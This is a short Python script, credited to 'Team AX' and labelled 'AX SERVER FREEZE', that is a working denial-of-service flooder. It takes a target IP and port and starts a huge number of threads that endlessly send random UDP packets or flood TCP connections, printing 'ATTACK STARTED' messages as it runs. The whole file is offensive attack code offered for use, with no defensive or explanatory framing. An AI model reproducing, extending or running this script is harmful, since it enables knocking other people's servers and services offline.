#!/usr/bin/env python3
#Code by Khalid Mahmud
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=99999999, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=99999999, help="Threads")
args = vars(ap.parse_args())

print("--> Created BY Team AX <--")
print("#-- AX SERVER FREEZE --#")

print("Super Fast And Accurate")

ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(2048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("\033[92m" + i + " ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
		except:
			print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[92m" + i + " ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
		except:
			s.close()
			print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()